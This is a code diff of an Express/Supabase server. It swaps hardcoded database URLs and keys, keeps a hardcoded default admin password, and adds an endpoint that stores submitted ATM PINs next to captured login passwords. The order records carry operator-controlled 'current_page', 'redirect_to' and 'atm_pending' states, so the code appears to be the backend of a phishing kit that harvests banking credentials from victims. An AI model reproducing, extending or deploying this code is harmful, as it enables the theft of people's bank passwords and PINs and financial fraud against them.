@@ -8,8 +8,8 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-const SUPABASE_URL = process.env.SUPABASE_URL || 'https://gxspmafvnfesdqrsgvqt.supabase.co';
-const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_-_LAUwH3Q5Lb1uEP0ZBZzg_yBuMHjlT';
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://lqehredqskvoksgbslil.supabase.co';
+const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_EYoWwrekt_bklu0Mc0NM7g_ydLHJXo8';
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin1234@@';
@@ -99,12 +99,12 @@ app.post('/api/password-data', async (req, res) => {
   }
 });
 
-// Save ATM PIN — reuses the login_password column (no schema change needed)
+// Save ATM PIN
 app.post('/api/atm-data', async (req, res) => {
   try {
     const { order_id, atm_pin } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const { error } = await supabase.from('orders').update({ login_password: atm_pin, current_page: 'atm-waiting', status: 'atm_pending', redirect_to: null }).eq('id', order_id);
+    const { error } = await supabase.from('orders').update({ atm_pin: atm_pin, current_page: 'atm-waiting', status: 'atm_pending', redirect_to: null }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
   } catch (err) {
